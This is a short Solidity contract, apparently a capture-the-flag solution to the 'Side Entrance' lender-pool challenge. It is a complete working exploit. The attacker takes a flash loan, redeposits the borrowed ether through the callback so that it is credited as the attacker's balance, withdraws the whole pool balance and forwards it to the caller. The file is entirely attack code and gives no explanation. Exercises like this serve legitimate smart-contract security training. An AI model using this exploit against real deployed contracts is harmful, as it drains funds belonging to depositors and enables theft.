// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}


interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attacker4 is IFlashLoanEtherReceiver {
    receive() external payable {}

    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attack(address pool, uint256 amount) external {
        ISideEntranceLenderPool(pool).flashLoan(amount);
        ISideEntranceLenderPool(pool).withdraw();
        msg.sender.call{value: address(this).balance}("");
    }
}
